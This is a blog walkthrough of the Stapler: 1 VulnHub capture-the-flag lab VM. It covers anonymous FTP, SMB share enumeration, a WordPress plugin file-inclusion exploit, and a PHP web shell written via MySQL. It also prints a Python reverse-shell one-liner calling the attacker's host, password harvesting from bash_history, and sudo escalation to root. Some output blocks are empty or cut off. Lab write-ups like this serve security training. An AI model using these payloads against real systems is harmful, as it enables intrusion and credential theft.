Welcome back to my 2nd - VulnHub CTF! This time we will be tackling [Stapler: 1]((https://www.vulnhub.com/entry/stapler-1,150/)!

So if you're ready... let's strap in - and pwn this box!

## The Hack:

If you already read my previous post, on the [Mr. Robot VM](https://jhalon.github.io/vulnhub-mr-robot1/) then you would already know, that the first thing we have to do (considering this is a pentest) is to [enumerate](https://www.securitywizardry.com/index.php/products/scanning-products/network-enumerators.html)!

As mentioned previously- if you want to learn more about the proper procedures and steps then I suggest you read the [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page).

So let's start the process with running `netdiscover` on our network to find the IP of our Attack Target.

```console
 Currently scanning: 192.168.23.0/16   |   Screen View: Unique Hosts           
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     00:26:f2:0c:b3:82      1      60  NETGEAR                     
 192.168.1.3     d8:cb:8a:bf:d0:59      1      60  Micro-Star INTL CO., LTD.   
 192.168.1.13    08:00:27:3d:e7:21      1      60  Cadmus Computer Systems 
```

The IP of **192.168.1.13** will be our target. WE can now proceed to running an nmap scan to enumerate any open ports, services, versions, and OS's.

```console
root@kali:~# nmap -sS -A -O -n -p1-60000 192.168.1.13

We can see that there are a ton of ports open that can be valuable to us: including FTP, NetBIOS (w/ SMB Shares), MySQL, and Port 12380 running a Web Server (Apache HTTPD).

The first thing that caught my eye, was the fact that FTP was allowing anonymous logins. So I made this my first target. Let's go ahead and login to FTP with the username: **anonymous** and the password: **anonymous**.

```console
root@kali:~# ftp 192.168.1.13
Connected to 192.168.1.13.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.

226 Directory send OK.

200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 0.00 secs (100.3767 kB/s)
ftp> exit

221 Goodbye.
```

We can see that after looking though the FTP server we come across a file called **note**. What we did is called the **get** command to download the file back to our host. WE can now open it and see what it contains.

```console
root@kali:~# cat note
Elly, make sure you update the payload information. Leave it in your FTP account once youâ€™re are done, John.
```

Nothing too interesting in there - but we do have a name. We can save this name for later uses; such as user enumeration, brute forcing, etc.

After FTP, I followed up with SSH to see if I can log in with root.

```console
root@kali:~# ssh root@192.168.1.13
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
root@192.168.1.13's password: 
Permission denied, please try again.
```

This unfortunately didn't provide me with anything - except a name - so I moved on.

My next target focused around TCP port 139, which was an open netbio-ssn. I decided to use `smbclient` to see if I can't enumerate any of the SMB Shares. When prompted for the root password, I just typed in **root**.

```console
root@kali:~# smbclient -L 192.168.1.13
WARNING: The "syslog" option is deprecated
Enter root's password:

	Workgroup            Master

WORKGROUP            RED
```

The thing that really caught my attention was the comment - **Fred, What are we doing here?**. This led me to believe that Fred had access to kathy's share. So what I attempted to do was to connect to kathy's share, on the networked user/computer fred.

```console
root@kali:~# smbclient //fred/kathy -I 192.168.1.13 -N

Nice! Looks like we were able to establish a connection! From here, let's go and enumerate the files and folder on the share. And if we find something we like - we can use the `get` command to download it.

```console
smb: \> cd kathy_stuff
smb: \kathy_stuff\> ls
  .                                   D        0  Sun Jun  5 10:02:27 2016

Once we are done with kathy's share, we can go ahead and login to the tmp share and do the same.

```console
root@kali:~# smbclient //fred/tmp -I 192.168.1.13 -N
WARNING: The "syslog" option is deprecated

smb: \> get ls
getting file \ls of size 274 as ls (13.4 KiloBytes/sec) (average 13.4 KiloBytes/sec)
smb: \> exit
```

Out of the files we got, it seems we got a WordPress Backup, a FTP Configuration file, an LS file, and a to-do-list.

Let's open the Note and LS file to see if we can't find anything interesting

```console
root@kali:~# cat to-do-list.txt
I'm making sure to backup anything important for Initech, Kathy
root@kali:~# cat ls
.:
total 12.0K
drwxrwxrwt  2 root root 4.0K Jun  5 16:32 .
drwxr-xr-x 16 root root 4.0K Jun  3 22:06 ..
-rw-r--r--  1 root root    0 Jun  5 16:32 ls
drwx------  3 root root 4.0K Jun  5 15:32 systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ
```

From the to-do-list we have another name, and from LS it seems we got a private system file... for now I will skip this as nothing showed up in the Samba Enumeration.

We will move on and try to access the web server this time. We can navigate to **192.168.1.13:12380** to access the Apache Web Server. Once done so, we will be presented with the following.

<a href="/images/stapler1.png"><img src="/images/stapler1.png"></a>

My first choice was to look at the websites source code to see if there aren't any clues left... unfortunately there wasn't. So I decided to fire up and run a nikto scan on the web server to check for any vulnerabilities and misconfigurations.

```console

```

Interestingly enough, I got presented with 4 directories: **/phpmyadin/**, **/blogblog/**, **/admin112233/**, and of course **/robots.txt**.

My initial attempts to try and navigate to the directories were futile, as the page kept going back to the home page. So I decided to add **http://** before the IP and try again. I entered the following url **https://192.168.1.13:12380/robots.txt**, and behold - I got the robots.txt page!

```console
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```

From here, I decided to try and navigate to **/admin112233/** as it seemed the most interesting to me.

<a href="/images/stapler2.png"><img src="/images/stapler2.png"></a>

Damnit! Okay, we all love to play tricks on people - but this nearly gave me a heart attack... Let's try the **/bloglbog/** page now.

<a href="/images/stapler3.png"><img src="/images/stapler3.png"></a>

The blog really didn't contain much information for us - except a few names - as well as the name of the poster. I also saw on the page that there was a "login" section. Navigating to that took me to a WordPress login page... so instead of logging in, why not run WPScan - and let's see if we can't enumerate and users, plugins, and vulnerabilities.

```console

After doing some research, I found out that the **advanced-video-embed-embed-videos-or-playlists** was vulnerable to a [LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion) Exploit. Which can be found [here!](https://www.exploit-db.com/exploits/39646/)

Upon downloading the exploit, and running it, I was presented with an SSL error... So I went ahead and edited the code to include the following

```python
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
```

Once it ran successfully - I navigated to **https://192.168.1.13:12380/blogblog/wp-content/uploads/** and was presented with a .jpeg file.

<a href="/images/stapler4.png"><img src="/images/stapler4.png"></a>

All I did was save the file to my desktop, and removed the .jpeg extension. When we open to review the file we can see the following:

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```

Perfect! We got the root login to the MySQL Server! Let's go ahead and connect to it!

```console
root@kali:~# mysql -u root -p -h 192.168.1.13
Enter password:

From here, I went ahead and tried to find the passwords in WordPress.

Awesome! We got the password hashes of all the users in the blog site. If we wanted to - we could use HashCat to crack the MD5 passwords - but I will leave that out for now, as I don't need a password (since I got root in the MySQL Server).

Since I am "root" in the MySQL Server, I decided to upload a PHP Shell in the **/wp-content/uplaods/** section as **shell.php**.

```console
mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```

Once done, we can navigate to **https://192.168.1.13:12380/blogblog/wp-content/uploads/**, and we should see our shell in there.

<a href="/images/stapler5.png"><img src="/images/stapler5.png"></a>

Once inside the shell, let's check to see if it works by typing in **?cmd=ifconfig** at the end of the url.

<a href="/images/stapler6.png"><img src="/images/stapler6.png"></a>

Perfect! Since we already have a PHP Shell in place, let's go ahead and set up a Netcat listener on our host, on port 443. This will be used for when we create our reverse shell through the PHP Shell.

```console
root@kali:~# nc -lvp 443
listening on [any] 443 ...
```

We will append the following to the end of the URL to initiate a reverse TCP Shell using Python.

```console
python%20-c%20'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

If done correctly, we should not have an established session between our host PC, and the target.

```console
192.168.1.13: inverse host lookup failed: Unknown host
connect to [192.168.1.7] from (UNKNOWN) [192.168.1.13] 52716
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@red:/var/www/https/blogblog/wp-content/uploads$ 
www-data@red:/var/www/https/blogblog/wp-content/uploads$ cd /
cd /
www-data@red:/$ ls
ls
bin   etc	      lib	  mnt	root  snap  tmp  vmlinuz.old
boot  home	      lost+found  opt	run   srv   usr
dev   initrd.img.old  media	  proc	sbin  sys   var
```

From this point, I created a small Bash script that will list all the bash_history's.

```console
www-data@red:/home$ find -name ".bash_history" -exec cat {} \;
find -name ".bash_history" -exec cat {} \;
free
ps aux
id
cat: ./peter/.bash_history: Permission denied
find: './peter/.cache': Permission denied
exit
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
whoami
www-data@red:/home$ 
```

When we look closely, we can see that there are 2 user names and passwords. The one I see come up the most is **peter**, and we also see his ssh password! So let's open up another console, and try to SSH into our target machine with peter's name and password.

```console
root@kali:~# ssh peter@192.168.1.13
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~

peter@192.168.1.13's password: 
Welcome back!

red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
```

From here, I learned that peter had sudo permission from the sudoer file. This I went and changed my shell from Z to bash, and went to capturing the flag!

```console
red% sudo usermod -s /bin/bash peter
red% sudo -i
âžœ  ~ cd /root
âžœ  ~ ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
âžœ  ~ cat flag.txt
